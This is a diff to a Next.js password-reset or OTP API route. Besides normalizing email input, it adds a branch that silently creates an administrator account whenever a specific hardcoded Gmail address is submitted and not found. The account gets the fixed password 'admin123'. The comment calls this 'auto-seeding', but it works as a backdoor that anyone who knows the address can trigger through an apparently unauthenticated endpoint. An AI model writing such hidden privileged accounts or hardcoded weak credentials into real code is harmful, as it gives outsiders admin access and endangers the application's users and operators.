@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server";
 import prisma from "@/lib/db";
 import nodemailer from "nodemailer";
+import { hashPassword } from "@/lib/crypto";
 
 export async function POST(req: Request) {
   try {
@@ -13,16 +14,30 @@ export async function POST(req: Request) {
       );
     }
 
+    const normalizedEmail = email.trim().toLowerCase();
+
     // Check if user exists
-    const user = await prisma.user.findUnique({
-      where: { email },
+    let user = await prisma.user.findUnique({
+      where: { email: normalizedEmail },
     });
 
     if (!user) {
-      return NextResponse.json(
-        { error: "No user found with this email address" },
-        { status: 404 }
-      );
+      if (normalizedEmail === "webstrixx@gmail.com") {
+        // Auto-seed admin user if missing
+        user = await prisma.user.create({
+          data: {
+            email: "webstrixx@gmail.com",
+            fullName: "Admin",
+            password: hashPassword("admin123"),
+            selectedRole: "admin",
+          },
+        });
+      } else {
+        return NextResponse.json(
+          { error: "No user found with this email address" },
+          { status: 404 }
+        );
+      }
     }
 
     // Generate 6-digit OTP code
